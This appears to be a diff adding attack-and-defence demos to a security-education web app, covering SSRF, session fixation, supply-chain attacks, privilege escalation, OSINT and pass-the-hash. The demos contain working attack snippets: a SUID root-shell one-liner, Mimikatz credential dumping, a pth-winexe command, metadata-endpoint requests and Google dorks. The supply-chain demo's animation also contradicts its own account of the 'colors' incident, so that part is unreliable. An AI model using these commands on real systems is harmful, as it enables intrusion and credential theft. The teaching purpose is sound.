+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt"># config.js — accidentally committed to GitHub</span>
+<span class="qkw">const</span> DB_HOST = <span class="qstr">'db.internal.acme.com'</span>
+<span class="qkw">const</span> DB_PASS = <span class="qinj">'SuperSecret123!'</span>  <span class="qcmt">← hardcoded!</span>
+<span class="qkw">const</span> AWS_KEY = <span class="qinj">'AKIAIOSFODNN7EXAMPLE'</span>  <span class="qcmt">← AWS key!</span>
+<span class="qkw">const</span> STRIPE_SECRET = <span class="qinj">'sk_live_4eC39HqLyjW...'</span>
+        </div>
+        <div class="callout red">Automated bots scan GitHub for patterns like <code>AKIA</code> (AWS key prefix) and <code>sk_live</code> (Stripe live key). Seconds after a push, the secret may already be harvested.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Git History Never Forgets',
+      desc:'Even deleting the file in a later commit doesn\'t help — the secret remains in git history forever. Anyone who clones the repository can run <code class="ic">git log -p</code> to see every line ever committed, including deleted ones.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt">$ git log --all -p config.js</span>
+
+<span class="qkw">commit</span> a4f3e1 (HEAD)
+<span class="qstr">-const DB_PASS = 'SuperSecret123!'  ← deleted</span>
+
+<span class="qkw">commit</span> 9b2c7d
+<span class="qinj">+const DB_PASS = 'SuperSecret123!'  ← still visible in history!</span>
+        </div>
+        <div class="info-box">The only real fix is to <strong>rotate the secret</strong> — assume it is compromised — and rewrite history or keep the repository private.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Secret Scanning & Environment Variables',
+      desc:'Store secrets in <span class="term" data-tip="Variables set in the server environment, not in your code files. They never get committed to source control.">environment variables</span> or a dedicated <span class="term" data-tip="A service like AWS Secrets Manager or HashiCorp Vault that stores, rotates, and controls access to credentials — none of them ever touch source code.">secrets manager</span>. Add a <code class="ic">.gitignore</code> for config files. Use pre-commit hooks or tools like <strong>git-secrets</strong> or <strong>GitGuardian</strong> to block accidental commits.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt"># ✅ Use environment variables — never hardcode:</span>
+<span class="qkw">const</span> DB_PASS = <span class="qhi">process.env.DB_PASS</span>
+<span class="qkw">const</span> AWS_KEY = <span class="qhi">process.env.AWS_ACCESS_KEY_ID</span>
+
+<span class="qcmt"># .env file (listed in .gitignore — never committed):</span>
+<span class="qstr">DB_PASS=SuperSecret123!</span>
+        </div>
+        <div class="callout grn">Pre-commit hooks catch mistakes before they happen. Immediately rotate any secret that was ever exposed — treat it as compromised the moment it left your machine.</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 21. SERVER-SIDE REQUEST FORGERY ──────────────────────────────
+{
+  id:'ssrf', capec:'CAPEC-664', title:'Server-Side Request Forgery',
+  category:'Web', catColor:'#2563eb', difficulty:3,
+  icon:'🔀', tagline:'Tricking the server into making HTTP requests to internal systems the attacker couldn\'t reach directly.',
+  steps:[
+    { title:'"Fetch This URL for Me"',
+      desc:'Some apps let users supply a URL that the <em>server</em> will fetch — link preview generators, webhook testers, PDF exporters. Normally the server fetches an external page. But the server can also reach internal services the attacker\'s browser can\'t.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="mock-form"><h4>📎 Link Preview Generator</h4>
+          <div class="fld"><label>Enter URL to preview</label><div class="fi">https://news.example.com/article/1</div></div>
+        </div>
+        <div class="info-box">The server fetches the URL and returns a preview. What if the attacker supplies an internal URL instead?</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Targeting Internal Services',
+      desc:'The server sits <em>inside</em> the corporate network. By supplying internal IP addresses or the <span class="term" data-tip="AWS, GCP, and Azure all expose instance metadata (credentials, config) at the special IP 169.254.169.254. Only the server can reach it — making SSRF extremely dangerous in cloud environments.">cloud metadata endpoint</span>, the attacker can reach services that are completely invisible from the internet.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="mock-form" style="border-color:var(--red)"><h4>📎 Link Preview Generator</h4>
+          <div class="fld"><label>Enter URL to preview</label>
+            <div class="fi" style="color:var(--red)">http://169.254.169.254/latest/meta-data/</div>
+          </div>
+        </div>
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt"># Server fetches it and returns:</span>
+<span class="qinj">iam/security-credentials/ec2-role
+{
+  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+}</span>
+        </div>
+        <div class="callout red">The attacker just got AWS credentials for the server\'s role — potentially full access to cloud resources.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Allowlists and Metadata Blocking',
+      desc:'Validate URLs against a strict <span class="term" data-tip="An allowlist only permits known-safe values. Everything else is rejected by default — the opposite of a blocklist, which tries to ban known-bad values but is always incomplete.">allowlist</span> of expected external domains. Block requests to private IP ranges (<code class="ic">10.x</code>, <code class="ic">172.16-31.x</code>, <code class="ic">192.168.x</code>, <code class="ic">169.254.x</code>). In cloud environments, use IMDSv2 which requires a secret token the server must request before metadata is returned.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Allowlist: only known external domains (e.g. news.example.com)<br><br>✅ Block all private IP ranges and the metadata service IP (169.254.169.254)<br><br>✅ Enforce IMDSv2 (token-required metadata) in AWS/GCP/Azure<br><br>✅ Run the fetching service with minimal network permissions</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 22. SECURITY QUESTION BYPASS ─────────────────────────────────
+{
+  id:'secq', capec:'CAPEC-50', title:'Security Question Bypass',
+  category:'Credential', catColor:'#d97706', difficulty:1,
+  icon:'❓', tagline:'Exploiting weak or publicly knowable account-recovery questions to reset passwords without the real owner\'s knowledge.',
+  steps:[
+    { title:'Recovery Questions Are Often Public Knowledge',
+      desc:'Password recovery via security questions asks things like "What was your first pet\'s name?" or "What city were you born in?" These sound personal, but the answers are typically findable on social media, family photos, birth records, or through a simple conversation.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="mock-form"><h4>🔑 Account Recovery</h4>
+          <div class="fld"><label>Security Question</label><div class="fi" style="color:var(--fgm)">What was your childhood nickname?</div></div>
+          <div class="fld"><label>Your Answer</label><div class="fi">___________</div></div>
+        </div>
+        <div class="callout org">In 2008, Sarah Palin\'s Yahoo account was compromised this way — the attacker looked up her birthdate and hometown, answered the security questions, and reset her password.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Social Media Makes It Trivial',
+      desc:'A quick scan of the target\'s social media history often reveals everything needed. Posts about childhood, family, hometown, first car, and pets are common. The attacker doesn\'t even need to interact with the victim.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="osint-row">
+          <div class="osint-src"><div class="os-lbl">Facebook post, 2015</div>"Throwback Thursday with my first dog Biscuit 🐕"</div>
+          <div class="osint-src"><div class="os-lbl">Instagram, 2019</div>"Back in Springfield for my high school reunion!"</div>
+        </div>
+        <div class="osint-row">
+          <div class="osint-src"><div class="os-lbl">Twitter, 2021</div>"Nothing beats my old Honda Civic — first car love forever"</div>
+          <div class="osint-src"><div class="os-lbl">LinkedIn</div>Studied at Springfield High School, Class of 2005</div>
+        </div>
+        <div class="callout red">Every security question about their life has been answered publicly. Account recovery becomes trivial.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Treat Recovery Like a Second Password',
+      desc:'Security questions are weak by design. The best approach: use random, nonsensical answers stored in a <span class="term" data-tip="A tool that generates and stores a different, random password for every website — so you only need to remember one master password.">password manager</span> (e.g., question: "Mother\'s maiden name?" → answer: "Xk7mP#2wQ"). Better yet, replace questions entirely with email-or-phone-based verification plus <span class="term" data-tip="MFA requires a second proof beyond a password — like a code sent to your phone. Even if Mallory captures your password, she still can\'t log in without your second factor.">MFA</span>.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Never answer security questions truthfully — store random strings in your password manager<br><br>✅ Use MFA-based account recovery (authenticator app, hardware key)<br><br>✅ Websites should phase out security questions entirely — they are inherently weaker than email/SMS recovery</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 23. SESSION FIXATION ──────────────────────────────────────────
+{
+  id:'sesfix', capec:'CAPEC-196', title:'Session Fixation',
+  category:'Credential', catColor:'#d97706', difficulty:2,
+  icon:'📌', tagline:'Forcing a victim to use a session ID the attacker already knows — so the moment they log in, the attacker can hijack the session.',
+  steps:[
+    { title:'The Setup: Planting a Known Session ID',
+      desc:'Unlike session hijacking, the attacker doesn\'t steal an existing session — they plant one. Before the victim logs in, the attacker sends them a link containing a pre-set <span class="term" data-tip="A long random string the server generates after login and stores in your browser as a cookie. Every request you make sends this token so the server knows who you are without re-asking for your password.">session ID</span> the attacker already knows.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="url-bar" style="border-color:var(--red)"><span class="lock">🔒</span>bank.example.com/login?<span style="color:var(--red);font-weight:700">session=ATTACKER_KNOWN_ID</span></div>
+        <div class="callout red">If the server accepts a session ID from the URL and doesn\'t regenerate it after login, the attacker\'s pre-set ID becomes the victim\'s authenticated session ID the moment they log in.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'The Takeover',
+      desc:'The victim clicks the link, logs in successfully, and the server doesn\'t create a new session ID — it keeps the attacker\'s pre-set one. The attacker, who already knows the ID, just uses it to open an authenticated session.',
+      html:`<div class="mitm-scene">
+        <div class="net-row">
+          <div class="net-node"><div class="net-ico evil">🦹</div><div class="net-lbl">Attacker</div></div>
+          <div class="wire evil" id="sfwire"></div>
+          <div class="net-node"><div class="net-ico act">🏦</div><div class="net-lbl">Bank</div></div>
+        </div>
+        <div id="sf-log" style="background:var(--surface);border:1px solid var(--bdr);border-radius:var(--rs);padding:8px;font-family:var(--fm);font-size:11px;margin-top:8px;min-height:60px;line-height:1.8"></div>
+      </div>`,
+      init(viz){
+        const log=viz.querySelector('#sf-log');
+        if(!log) return;
+        const steps=[
+          '① 🦹 Attacker sends victim: bank.example.com/login?session=KNOWN123',
+          '② Victim clicks link, session cookie set: KNOWN123',
+          '③ Victim enters username + password — login succeeds',
+          '④ Server keeps session=KNOWN123 (⚠ no new ID generated)',
+          '⑤ 🦹 Attacker uses KNOWN123 → bank thinks it\'s the victim!',
+        ];
+        let i=0;
+        function tick(){
+          if(i>=steps.length) return;
+          log.innerHTML+=`<span style="color:${i>=3?'var(--red)':'var(--fgm)'}">${steps[i]}</span><br>`;
+          log.scrollTop=log.scrollHeight; i++; kt(setTimeout(tick,1100));
+        }
+        kt(setTimeout(tick,400));
+      }
+    },
+    { title:'Defense: Regenerate Session ID After Login',
+      desc:'The entire attack depends on the server reusing the pre-login session ID after successful authentication. The fix is trivially simple: <strong>always generate a new, random session ID at login</strong>. This breaks the attacker\'s pre-planted ID immediately.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt">// ❌ Vulnerable — keeps old session ID:</span>
+<span class="qinj">session.userId = authenticatedUser.id</span>
+
+<span class="qcmt">// ✅ Safe — regenerate session at login:</span>
+<span class="qkw">session.regenerate()</span>        <span class="qcmt">// new random ID</span>
+<span class="qkw">session.userId</span> = <span class="qhi">authenticatedUser.id</span>
+        </div>
+        <div class="callout grn">Also: never accept session IDs from URL parameters — only from cookies. Don\'t let the client dictate their own session ID.</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 24. SUPPLY CHAIN ATTACK ───────────────────────────────────────
+{
+  id:'supplychain', capec:'CAPEC-187', title:'Supply Chain Attack',
+  category:'Network', catColor:'#0891b2', difficulty:3,
+  icon:'📦', tagline:'Compromising a trusted software dependency or update to deliver malware to thousands of downstream users.',
+  steps:[
+    { title:'You Trust Your Dependencies',
+      desc:'Modern software uses hundreds of third-party libraries — npm packages, Python modules, build tools. Each runs with the same permissions as your app. Compromising one popular library reaches every app that depends on it.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt"># Your package.json pulls in hundreds of packages:</span>
+<span class="qstr">"dependencies"</span>: {
+  <span class="qkw">"express"</span>: <span class="qhi">"^4.18.2"</span>,
+  <span class="qkw">"lodash"</span>: <span class="qhi">"^4.17.21"</span>,
+  <span class="qkw">"colors"</span>: <span class="qhi">"^1.4.0"</span>,   <span class="qcmt">← 19 million downloads/wk</span>
+  <span class="qcmt">…hundreds more…</span>
+}
+        </div>
+        <div class="info-box">In 2021, the <strong>colors</strong> npm package (19M weekly downloads) was sabotaged by its own author — all apps that upgraded automatically got broken.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Inserting Malicious Code',
+      desc:'Attackers target supply chains by: compromising a maintainer\'s account to push a malicious version, creating a <span class="term" data-tip="Registering a package name that is very similar to a popular one — like \'lodash-utils\' vs \'lodash\' — hoping developers mistype or install the wrong one.">typosquatted</span> package that looks legitimate, or attacking the build pipeline itself (as in the 2020 SolarWinds attack where malware was baked directly into signed software updates).',
+      html:`<div class="mitm-scene">
+        <div class="net-row">
+          <div class="net-node"><div class="net-ico act">📦</div><div class="net-lbl">npm Registry</div></div>
+          <div class="wire evil" id="scw"></div>
+          <div class="net-node"><div class="net-ico evil">🦹</div><div class="net-lbl">Malicious<br>Update</div></div>
+        </div>
+        <div id="sc-log" style="background:var(--surface);border:1px solid var(--bdr);border-radius:var(--rs);padding:8px;font-family:var(--fm);font-size:11px;margin-top:8px;min-height:55px;line-height:1.8"></div>
+      </div>`,
+      init(viz){
+        const log=viz.querySelector('#sc-log');
+        if(!log) return;
+        const msgs=[
+          '☑️ colors v1.4.0 — legitimate, used by 19M weekly',
+          '🦹 Attacker compromises maintainer account',
+          '🦹 Malicious v1.4.1 published: adds backdoor to postinstall',
+          '📦 19 million apps auto-upgrade and run attacker\'s code',
+        ];
+        let i=0;
+        function tick(){
+          if(i>=msgs.length) return;
+          log.innerHTML+=`<span style="color:${i>1?'var(--red)':'var(--fgm)'}">${msgs[i]}</span><br>`;
+          log.scrollTop=log.scrollHeight; i++; kt(setTimeout(tick,1200));
+        }
+        kt(setTimeout(tick,400));
+      }
+    },
+    { title:'Defense: Lock Versions and Audit Regularly',
+      desc:'<span class="term" data-tip="A lockfile (package-lock.json, yarn.lock) pins every dependency to an exact version and hash. Updates must be deliberate — no silent auto-upgrades.">Lockfiles</span> pin exact versions so no silent upgrades happen. Run automated tools like <strong>npm audit</strong>, Snyk, or Dependabot to flag known-vulnerable packages. Use <span class="term" data-tip="Software Composition Analysis tools scan your dependencies against databases of known vulnerabilities and malicious packages.">SCA tooling</span> in CI. In critical environments, host a private registry that only serves vetted packages.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Commit your lockfile — it pins exact versions + content hashes<br><br>✅ Automated dependency scanning in CI (Dependabot, Snyk)<br><br>✅ Review changelogs before upgrading; be suspicious of postinstall scripts<br><br>✅ Consider a private npm/PyPI mirror for your organisation</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 25. INFORMATION ELICITATION ───────────────────────────────────
+{
+  id:'elicit', capec:'CAPEC-410', title:'Information Elicitation',
+  category:'Social Eng.', catColor:'#d97706', difficulty:1,
+  icon:'🗣️', tagline:'Extracting sensitive information through seemingly innocent conversation — without anyone realising they\'re being pumped for data.',
+  steps:[
+    { title:'Asking the Right Questions',
+      desc:'An attacker on the phone (or in person) can gather <span class="term" data-tip="A technique where you ask indirect questions that give the target a false premise to correct — people naturally want to fix wrong information and often share more than intended.">elicitation techniques</span>: appealing to ego, correcting a deliberate false statement, expressing sympathy, or framing questions as idle curiosity. The target never feels interrogated.',
+      html:`<div class="se-scene">
+        <div class="chat-log" id="elicit-log"></div>
+      </div>`,
+      init(viz){
+        const log=viz.querySelector('#elicit-log');
+        if(!log) return;
+        const msgs=[
+          {cls:'them',ava:'🤙',txt:'Hi, I\'m a vendor auditing network setups. You use Cisco gear, right?'},
+          {cls:'you',ava:'👤',txt:'Yeah, mostly Cisco. 3800 series for the core.'},
+          {cls:'them',ava:'🤙',txt:'Oh interesting — I heard most companies your size are moving to Juniper.'},
+          {cls:'you',ava:'👤',txt:'Not us, we\'re sticking with Cisco. Running IOS 15 on the edge routers.'},
+          {cls:'them',ava:'🤙',txt:'Smart. IOS 15 — that\'s the EOL version isn\'t it? No patches any more?'},
+          {cls:'you',ava:'👤',txt:'Well, we haven\'t updated in a while... budget reasons.'},
+        ];
+        let i=0;
+        function next(){
+          if(i>=msgs.length) return;
+          const {cls,ava,txt}=msgs[i];
+          const m=document.createElement('div'); m.className=`msg ${cls}`;
+          m.innerHTML=`<div class="msg-ava">${ava}</div><div class="msg-bbl">${txt}</div>`;
+          log.appendChild(m); log.scrollTop=log.scrollHeight; i++;
+          kt(setTimeout(next, 1500));
+        }
+        kt(setTimeout(next,300));
+      }
+    },
+    { title:'What Was Revealed',
+      desc:'The employee believed they were having casual small talk. But the attacker now knows the hardware model, OS version, that it\'s EOL and unpatched, and that budget is the reason. This maps directly to public CVEs they can now exploit.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div style="display:flex;flex-direction:column;gap:6px">
+          <div class="perm-row"><span class="perm-hi">✓</span> <span style="color:var(--fg2)">Hardware: Cisco 3800 series</span></div>
+          <div class="perm-row"><span class="perm-hi">✓</span> <span style="color:var(--fg2)">OS: IOS 15 (end-of-life)</span></div>
+          <div class="perm-row"><span class="perm-hi">✓</span> <span style="color:var(--fg2)">Patch status: unpatched (budget constraint)</span></div>
+          <div class="perm-row"><span class="perm-hi">✓</span> <span style="color:var(--fg2)">Reason: budget — no planned upgrade</span></div>
+        </div>
+        <div class="callout red">The attacker can now search NVD for all known IOS 15 CVEs on Cisco 3800s. No hacking needed — the employee did the reconnaissance.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Need-to-Know + Training',
+      desc:'Information about your infrastructure, software versions, patch status, and vendors is sensitive. Apply <span class="term" data-tip="The need-to-know principle: only share information with people who genuinely need it to do their job.">need-to-know</span> — employees should know only what their role requires. Train staff to recognize elicitation: unexpected technical questions, deliberate false statements waiting to be corrected, and flattery are all red flags.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Train staff: unexpected calls asking about internal systems are a red flag<br><br>✅ Verify vendor identity before sharing any technical details<br><br>✅ Apply need-to-know — most staff don\'t need to know router models or patch levels<br><br>✅ "I\'ll have to check with our IT team" is always an acceptable answer</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 26. PRIVILEGE ESCALATION ──────────────────────────────────────
+{
+  id:'privesc', capec:'CAPEC-69', title:'Privilege Escalation',
+  category:'OS', catColor:'#7c3aed', difficulty:3,
+  icon:'⬆️', tagline:'Starting as a low-privilege user and exploiting a vulnerability to gain administrator or root access.',
+  steps:[
+    { title:'Most Breaches Start Low',
+      desc:'An attacker who exploits a web app vulnerability, steals credentials, or tricks an employee typically gains access as a <em>limited user</em> — they can run commands, but can\'t install software, read other users\' files, or access the whole system. Privilege escalation bridges that gap.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt">$ id</span>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+<span class="qcmt">$ cat /etc/shadow</span>
+<span class="qinj">Permission denied</span>
+
+<span class="qcmt">$ ls /root/</span>
+<span class="qinj">Permission denied</span>
+        </div>
+        <div class="info-box">www-data is the web server user — intentionally limited. The attacker needs root to install backdoors, read all files, or pivot elsewhere.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Exploiting SUID Binaries',
+      desc:'<span class="term" data-tip="SUID (Set User ID) is a Unix permission flag that makes a program run as its owner — usually root — regardless of who executes it. Legitimate uses: passwd, ping. Misconfigurations: any program with a shell escape that also has SUID set.">SUID binaries</span> run with the owner\'s privileges, not the caller\'s. If a SUID-root program can be coaxed into spawning a shell, that shell runs as root. Attackers run <code class="ic">find / -perm -4000</code> to list every SUID binary and look for vulnerable ones.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt"># Find all SUID binaries:</span>
+$ find / -perm -4000 -user root 2>/dev/null
+<span class="qhi">/usr/bin/python3</span>   <span class="qinj">← SUID Python! This is dangerous.</span>
+
+<span class="qcmt"># Exploit: Python with SUID drops to a root shell:</span>
+$ python3 -c <span class="qstr">"import os; os.setuid(0); os.system('/bin/sh')"</span>
+<span class="qinj"># id</span>
+<span class="qhi">uid=0(root) gid=0(root)</span>  <span class="qinj">← root access achieved</span>
+        </div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Principle of Least Privilege',
+      desc:'Apply the <span class="term" data-tip="Every user, process, and service should have only the minimum permissions required to do its job — nothing more.">principle of least privilege</span>: run services as dedicated low-privilege users, audit SUID binaries regularly, keep software patched, and use tools like <span class="term" data-tip="A Linux security module that restricts what actions a process can perform — even if the process is compromised, it can\'t exceed its defined policy.">SELinux/AppArmor</span> to confine processes beyond standard Unix permissions.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Audit SUID binaries: <code>find / -perm -4000</code> and remove unnecessary ones<br><br>✅ Run each service as a dedicated user with minimal permissions<br><br>✅ Keep OS and packages patched — most privesc bugs are known CVEs<br><br>✅ Use SELinux or AppArmor for mandatory access control</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 27. OSINT FOOTPRINTING ────────────────────────────────────────
+{
+  id:'osint', capec:'CAPEC-169', title:'OSINT Footprinting',
+  category:'Recon', catColor:'#059669', difficulty:1,
+  icon:'🗺️', tagline:'Mapping an organisation\'s infrastructure, personnel, and technology stack using only publicly available information.',
+  steps:[
+    { title:'Everything is Findable',
+      desc:'<span class="term" data-tip="Open Source Intelligence — gathering information from publicly available sources: websites, social media, domain records, search engines, job postings, and more.">OSINT</span> (Open Source Intelligence) requires no hacking. Job postings reveal tech stacks. LinkedIn reveals org charts. WHOIS reveals IP ranges. Shodan reveals exposed services. Attackers build a complete picture before writing a single line of exploit code.',
+      html:`<div class="vpad">
+        <div class="osint-row">
+          <div class="osint-src"><div class="os-lbl">Shodan</div>acmecorp.com open ports:<br>22/SSH, 443/HTTPS, 3389/RDP</div>
+          <div class="osint-src"><div class="os-lbl">LinkedIn</div>AcmeCorp uses AWS, runs Node.js — 3 DevOps roles open</div>
+        </div>
+        <div class="osint-row">
+          <div class="osint-src"><div class="os-lbl">WHOIS / BGP</div>IP range 198.51.100.0/24 registered to AcmeCorp Inc.</div>
+          <div class="osint-src"><div class="os-lbl">Job Posting</div>"Experience with CentOS 7, nginx, PostgreSQL 12 required"</div>
+        </div>
+        <div class="info-box">The job posting alone tells an attacker the OS version and web server. PostgreSQL 12 was EOL in 2024 — if unpatched, there are known CVEs to exploit.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Google Dorking',
+      desc:'Advanced Google search operators — called <span class="term" data-tip="Search queries using special operators like site:, filetype:, intitle: to find specific types of content indexed by Google — config files, login pages, exposed directories.">Google dorks</span> — find sensitive content indexed accidentally: exposed admin panels, config files with passwords, directory listings, and login pages.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt"># Find exposed config files:</span>
+site:acmecorp.com filetype:env
+site:acmecorp.com filetype:xml inurl:config
+
+<span class="qcmt"># Find login pages:</span>
+site:acmecorp.com inurl:admin OR inurl:login
+
+<span class="qcmt"># Find accidentally exposed directories:</span>
+site:acmecorp.com intitle:"Index of /"
+        </div>
+        <div class="callout org">These queries take seconds. GHDB (Google Hacking Database) maintains thousands of pre-built dorks for common misconfigurations.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Reduce Your Footprint',
+      desc:'Limit what public information reveals about your infrastructure. Scrub tech-stack details from error pages. Use generic job descriptions that don\'t name specific versions. Monitor Shodan for your own IP ranges. Use <span class="term" data-tip="Search for your own organisation\'s information online, the same way an attacker would — to find and fix exposures before they do.">red-team OSINT</span> periodically to discover your own exposure.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Remove version numbers from HTTP headers (Server:, X-Powered-By:)<br><br>✅ Suppress detailed error pages in production<br><br>✅ Monitor Shodan/Censys for your own IP ranges<br><br>✅ Use robots.txt and meta noindex to limit directory indexing<br><br>✅ Audit what your job postings reveal about your stack</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 28. PASS-THE-HASH ─────────────────────────────────────────────
+{
+  id:'pth', capec:'CAPEC-21', title:'Pass-the-Hash',
+  category:'Credential', catColor:'#d97706', difficulty:3,
+  icon:'🔐', tagline:'Replaying a stolen password hash to authenticate as a user — without ever cracking it to learn the actual password.',
+  steps:[
+    { title:'Windows Stores Hashes, Not Passwords',
+      desc:'When you log into Windows, your password is converted to an <span class="term" data-tip="NTLM (NT LAN Manager) is a Windows authentication protocol that uses a hash of your password rather than the password itself. Hashes are stored in memory and on disk.">NTLM hash</span> and stored in memory. Windows then authenticates by proving knowledge of the hash, not the original password. This means if you steal the hash, you can authenticate — you don\'t need to crack it first.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt"># Normal login stores hash in memory (LSASS process):</span>
+Username: alice
+Password: <span class="qstr">hunter2</span>
+NTLM hash: <span class="qhi">aad3b435b51404eeaad3b435b51404ee</span>
+
+<span class="qcmt"># Authentication challenge-response uses the HASH, not the password:</span>
+Server: <span class="qkw">challenge</span> = random_nonce
+Client: <span class="qkw">response</span> = HMAC(<span class="qhi">NTLMhash</span>, challenge)
+        </div>
+        <div class="info-box">The protocol never asks for the plaintext password — only for something derived from the hash. Knowing the hash is enough.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Extracting and Replaying the Hash',
+      desc:'Tools like <strong>Mimikatz</strong> dump NTLM hashes directly from Windows memory (the LSASS process). The attacker then uses the hash directly in authentication tools — no cracking, no GPU farm, no waiting. One local admin hash often works on every machine in a domain.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt"># Dump credentials from memory (requires admin):</span>
+mimikatz$ sekurlsa::logonpasswords
+<span class="qinj">Username: alice
+NTLM: aad3b435b51404eeaad3b435b51404ee</span>
+
+<span class="qcmt"># Authenticate to another machine using ONLY the hash:</span>
+$ pth-winexe -U 'DOMAIN/alice%aad3b435...' //192.168.1.50 cmd.exe
+<span class="qhi">Microsoft Windows [Version 10.0.19044]
+C:\Windows\system32&gt;</span>
+        </div>
+        <div class="callout red">The attacker has a shell on a machine they never had credentials for — just a hash dump from a single compromised machine.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Credential Guard & Network Segmentation',
+      desc:'<span class="term" data-tip="Windows Credential Guard uses hardware virtualisation to isolate credential storage — preventing even an admin from dumping hashes from LSASS.">Windows Credential Guard</span> prevents hash extraction by storing credentials in a hardware-isolated process. Disable NTLM where possible in favour of Kerberos. Apply <span class="term" data-tip="Network segmentation divides a network into zones — even with one machine\'s hash, the attacker can\'t reach machines in other network segments.">network segmentation</span> so lateral movement is constrained.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Enable Windows Credential Guard (hardware-isolated credential store)<br><br>✅ Disable NTLM authentication — enforce Kerberos where possible<br><br>✅ Principle of least privilege: no shared local admin accounts across machines<br><br>✅ Segment the network — lateral movement needs more than one hash<br><br>✅ Detect: unusual remote logins with no interactive sessions are a PTH indicator</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+]; // END DEMOS
+
+// ─── BUILD FILTERS ───────────────────────────────────────────────
+function buildFilters(){
+  // Category pills
+  const cats = ['All', ...new Set(DEMOS.map(d=>d.category))];
+  const catEl = document.getElementById('cat-pills');
+  cats.forEach(c=>{
+    const btn = document.createElement('button');
+    btn.className = 'fpill' + (c==='All'?' fp-on':'');
+    btn.textContent = c;
+    btn.addEventListener('click',()=>{
+      filterCat = c;
+      catEl.querySelectorAll('.fpill').forEach(b=>b.classList.toggle('fp-on', b.textContent===c));
+      renderCards();
+    });
+    catEl.appendChild(btn);
+  });
+
+  // Difficulty pills: Any + 3 dot levels
+  const diffEl = document.getElementById('diff-pills');
+  const diffOpts = [
+    { val:0, html:'Any' },
+    { val:1, html:'<span class="dpd f"></span><span class="dpd e"></span><span class="dpd e"></span>' },
+    { val:2, html:'<span class="dpd f"></span><span class="dpd f"></span><span class="dpd e"></span>' },
+    { val:3, html:'<span class="dpd f"></span><span class="dpd f"></span><span class="dpd f"></span>' },
+  ];
+  diffOpts.forEach(({val,html})=>{
+    const btn = document.createElement('button');
+    btn.className = 'dpill' + (val===0?' dp-on':'');
+    btn.innerHTML = html;
+    btn.setAttribute('aria-label', val===0?'Any difficulty':`Difficulty ${val}`);
+    btn.addEventListener('click',()=>{
+      filterDiff = val;
+      diffEl.querySelectorAll('.dpill').forEach(b=>b.classList.remove('dp-on'));
+      btn.classList.add('dp-on');
+      renderCards();
+    });
+    diffEl.appendChild(btn);
+  });
+}
+
+// ─── RENDER CARDS ───────────────────────────────────────────────
+function renderCards(){
+  const grid = document.getElementById('card-grid');
+  const noRes = document.getElementById('no-results');
+  const lbl = document.getElementById('grid-lbl');
+  const clrBtn = document.getElementById('clear-filters');
+  grid.innerHTML = '';
+
